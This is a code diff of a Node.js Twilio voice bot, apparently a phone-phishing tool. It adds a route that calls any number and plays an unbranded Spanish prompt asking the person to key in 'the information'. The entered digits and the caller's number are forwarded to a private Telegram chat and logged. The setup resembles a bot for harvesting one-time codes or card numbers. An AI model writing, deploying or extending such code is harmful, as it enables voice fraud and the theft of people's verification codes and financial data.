@@ -4,19 +4,19 @@ const axios = require('axios');
 const app = express();
 app.use(express.urlencoded({ extended: true }));
 
-// 1. Leemos las variables de Render
+// 1. Variables de Render
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+const TWILIO_SID = process.env.TWILIO_SID;
+const TWILIO_AUTH_TOKEN = process.env.TWILIO_AUTH_TOKEN;
+const TWILIO_NUMERO = process.env.TWILIO_NUMERO;
 
-// Revisar que sí estén
-if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
-  console.log("ERROR: Falta TELEGRAM_TOKEN o TELEGRAM_CHAT_ID en variables de Render");
-}
+const client = twilio(TWILIO_SID, TWILIO_AUTH_TOKEN);
 
-// Cuando entra la llamada
+// 2. CUANDO ENTRA UNA LLAMADA - El bot habla
 app.post('/voice', (req, res) => {
   const twiml = new twilio.twiml.VoiceResponse();
-  twiml.say({language: 'es-MX', voice: 'Polly.Lucia'}, 'Digite la información y presione numeral');
+  twiml.say({language: 'es-CO', voice: 'Polly.Lucia'}, 'Digite la información y presione numeral');
   twiml.gather({ 
     input: 'dtmf',
     timeout: 10,
@@ -24,13 +24,13 @@ app.post('/voice', (req, res) => {
     finishOnKey: '#',
     action: '/resultado'
   });
-  twiml.say({language: 'es-MX'}, 'No recibí datos. Adios');
+  twiml.say({language: 'es-CO'}, 'No recibí datos. Adios');
   twiml.hangup();
   res.type('text/xml');
   res.send(twiml.toString());
 });
 
-// Cuando el usuario marca
+// 3. CUANDO EL USUARIO MARCA - Se envía a Telegram
 app.post('/resultado', async (req, res) => {
   const digits = req.body.Digits;
   const from = req.body.From;
@@ -42,16 +42,32 @@ app.post('/resultado', async (req, res) => {
       chat_id: TELEGRAM_CHAT_ID,
       text: mensaje
     });
+    console.log("Enviado a Telegram:", digits);
   } catch (error) {
     console.log("Error enviando a Telegram:", error.message);
   }
   
   const twiml = new twilio.twiml.VoiceResponse();
-  twiml.say({language: 'es-MX', voice: 'Polly.Lucia'}, 'Información recibida. Gracias');
+  twiml.say({language: 'es-CO', voice: 'Polly.Lucia'}, 'Información recibida. Gracias');
   twiml.hangup();
   res.type('text/xml');
   res.send(twiml.toString());
 });
 
+// 4. NUEVO: PARA QUE EL BOT LLAME - Entra a /llamar/+57300xxxxxxx
+app.get('/llamar/:numero', async (req, res) => {
+  try {
+    await client.calls.create({
+      to: req.params.numero, // A quien llamar
+      from: TWILIO_NUMERO, // Tu número de Twilio
+      url: 'https://llamadassinlimites.onrender.com/voice' // Que ruta ejecutar
+    });
+    res.send(`Llamando a ${req.params.numero}...`);
+  } catch (error) {
+    res.send("Error: " + error.message);
+  }
+});
+
+// 5. Prender server
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log('Bot corriendo en puerto', PORT));
